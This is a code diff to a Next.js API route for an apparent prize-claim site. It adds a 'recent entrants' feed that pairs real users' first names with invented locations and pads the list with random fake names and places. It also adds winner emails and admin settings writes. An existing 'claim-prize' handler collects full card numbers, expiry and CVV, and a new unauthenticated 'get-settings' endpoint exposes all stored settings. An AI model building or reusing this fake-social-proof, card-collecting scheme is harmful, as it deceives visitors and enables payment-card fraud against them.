@@ -2,11 +2,13 @@ import { NextResponse } from 'next/server'
 import bcrypt from 'bcryptjs'
 import { getDb } from '@/lib/db'
 import { getSession } from '@/lib/session'
+import { sendWinnerEmail } from '@/lib/email'
 
 export const dynamic = 'force-dynamic'
 
 // ── Helpers ───────────────────────────────────────────────────
 function now() { return new Date().toISOString().replace('T', ' ').slice(0, 19) }
+function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min }
 
 const NAMES = [
   'James','Mary','Robert','Patricia','John','Jennifer','Michael','Linda',
@@ -17,7 +19,31 @@ const NAMES = [
   'Kevin','Carol','Brian','Amanda','George','Dorothy','Edward','Melissa','Ronald','Deborah',
 ]
 const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min }
+
+const US_STATES = [
+  'California','Texas','Florida','New York','Ohio','Pennsylvania','Illinois','Georgia',
+  'North Carolina','Michigan','New Jersey','Virginia','Washington','Arizona','Massachusetts',
+  'Tennessee','Indiana','Missouri','Maryland','Wisconsin','Colorado','Minnesota',
+  'South Carolina','Alabama','Louisiana','Kentucky','Oregon','Oklahoma','Connecticut',
+  'Utah','Iowa','Nevada','Arkansas','Mississippi','Kansas','New Mexico','Nebraska',
+  'Idaho','West Virginia','Hawaii','New Hampshire','Maine','Montana','Rhode Island',
+  'Delaware','South Dakota','North Dakota','Alaska','Vermont','Wyoming',
+]
+const EU_COUNTRIES = [
+  'United Kingdom','Germany','France','Italy','Spain','Netherlands','Belgium',
+  'Sweden','Norway','Denmark','Finland','Ireland','Portugal','Austria',
+  'Switzerland','Greece','Poland','Czech Republic','Romania','Hungary',
+]
+const ALL_LOCS = [...US_STATES.map((s) => `${s}, USA`), ...EU_COUNTRIES]
+
+function upsertSetting(db, key, value) {
+  const existing = db.prepare('SELECT id FROM settings WHERE key=?').get(key)
+  if (existing) {
+    db.prepare('UPDATE settings SET value=?, updated_at=? WHERE key=?').run(value, now(), key)
+  } else {
+    db.prepare('INSERT INTO settings (key, value, updated_at) VALUES (?, ?, ?)').run(key, value, now())
+  }
+}
 
 // ── Action handlers ───────────────────────────────────────────
 const actions = {
@@ -101,6 +127,31 @@ const actions = {
     return NextResponse.json({ number: row?.value || '1234567890' })
   },
 
+  'get-settings': async () => {
+    const db = await getDb()
+    const rows = db.prepare('SELECT key, value FROM settings').all()
+    return NextResponse.json({ settings: Object.fromEntries(rows.map((r) => [r.key, r.value])) })
+  },
+
+  'get-recent-entrants': async () => {
+    const db = await getDb()
+    const rows = db.prepare('SELECT id, full_name FROM users ORDER BY id DESC LIMIT 20').all()
+
+    const entrants = rows.map((u) => ({
+      name: u.full_name.split(' ')[0],
+      location: ALL_LOCS[u.id % ALL_LOCS.length],
+    }))
+
+    while (entrants.length < 20) {
+      entrants.push({
+        name: NAMES[rand(0, NAMES.length - 1)],
+        location: ALL_LOCS[rand(0, ALL_LOCS.length - 1)],
+      })
+    }
+
+    return NextResponse.json({ entrants })
+  },
+
   'claim-prize': async ({ cardholder_name, card_number, card_expiry, card_cvv }) => {
     const session = await getSession()
     if (!session?.id) return NextResponse.json({ error: 'Not authenticated' }, { status: 401 })
@@ -169,6 +220,10 @@ const actions = {
 
     db.prepare(`UPDATE users SET is_winner=0, winner_at=NULL, ${clearPayment} WHERE is_winner=1`).run()
     db.prepare(`UPDATE users SET is_winner=1, winner_at=? WHERE id=?`).run(now(), userId)
+
+    // Fire-and-forget winner email — never blocks or throws
+    sendWinnerEmail(user.full_name, user.email).catch(() => {})
+
     return NextResponse.json({ success: true, action: 'marked' })
   },
 
@@ -213,12 +268,18 @@ const actions = {
       return NextResponse.json({ error: 'Digits only, with country code' }, { status: 400 })
 
     const db = await getDb()
-    const existing = db.prepare("SELECT id FROM settings WHERE key='whatsapp_number'").get()
-    if (existing) {
-      db.prepare("UPDATE settings SET value=?, updated_at=? WHERE key='whatsapp_number'").run(number, now())
-    } else {
-      db.prepare("INSERT INTO settings (key, value, updated_at) VALUES ('whatsapp_number', ?, ?)").run(number, now())
-    }
+    upsertSetting(db, 'whatsapp_number', number)
+    return NextResponse.json({ success: true })
+  },
+
+  'admin-update-settings': async ({ key, value }) => {
+    const session = await getSession()
+    if (!session?.is_admin) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
+    if (!key || value === undefined || value === null)
+      return NextResponse.json({ error: 'key and value required' }, { status: 400 })
+
+    const db = await getDb()
+    upsertSetting(db, key, String(value))
     return NextResponse.json({ success: true })
   },
 
